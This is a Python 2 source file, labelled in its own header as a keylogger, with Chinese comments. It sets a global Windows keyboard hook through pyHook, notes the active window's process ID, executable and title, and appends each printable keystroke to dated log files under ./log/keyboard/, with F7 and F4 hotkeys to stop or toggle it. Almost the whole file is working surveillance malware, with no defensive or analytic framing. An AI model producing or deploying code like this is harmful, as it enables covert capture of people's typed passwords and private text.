#coding:utf-8
#keylogger

from ctypes import *
import pythoncom
import pyHook
import time,os
import win32clipboard
import Queue
import win32api

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi



current_window = None
buffers = ""
switch = True
preWindowName = None


#定义监听键盘事件函数
def onKeyboardEvent(event) :
    '''监听键盘事件'''
    global current_window, switch, preWindowName,buffers
    
    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()
    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))

    # 将进程ID存入变量中
    process_id = "%d" % pid.value

    
             
    if current_window != process_id:
        if current_window != None:
            
            if not os.path.exists(keyboardFilepath) :
                os.makedirs(keyboardFilepath)
            if switch :
                localTime = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime())
                datafileName = localTime[:localTime.find(" ")] + ".txt"
                #列表list
                #str.find()返回的是匹配的第一个字符串的位置
                #time keyvalue Key WindowName
                if not os.path.exists(keyboardFilepath + datafileName) :
                    f = open(keyboardFilepath + datafileName,"w")
                    f.write("localTime            PID              executable            windowName                  keyvalue                key             \n")
                    f.close()
                if type(event.WindowName) == str :
                    
                    #note4
                    f = open(keyboardFilepath + datafileName,'a')
                    f.write(buffers+"\n\r")
                    f.close()
        #读取程序运行时间
        localTime = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime())

        

        # 申请内存
        executable = create_string_buffer("\x00"*512)
        h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)

        psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

        # 读取窗口标题
        windows_title = create_string_buffer("\x00"*512)
        length = user32.GetWindowTextA(hwnd,byref(windows_title),512)
            

                           
        current_window = process_id
        buffers = localTime + '||' + process_id  + '||' + executable.value + '||' + event.WindowName + '||'

    if event.Ascii >= 32 and event.Ascii <= 127:
        buffers += event.Key
        
    print event.KeyID, event.Key
    if event.KeyID == 118:#Key = F7
        switch = False
        win32api.PostQuitMessage()
    if event.KeyID == 115:#Key = F4
        switch = True
    #print event.KeyID
    #同鼠标监听事件函数的返回值
    return True

def main() :
    
    '''创建一个钩子管理对象'''
    hm = pyHook.HookManager()

    #监听所有键盘事件
    hm.KeyDown = onKeyboardEvent

    #设置键盘钩子
    hm.HookKeyboard()

    

    #进入循环，如不手动关闭，程序将一直处于监听状态
    pythoncom.PumpMessages()

if __name__ == "__main__" :
    keyboardFilepath = "./log/keyboard/"
    
    preWindowName = ''
    switch = True #控制是否开启日志功能
    main()
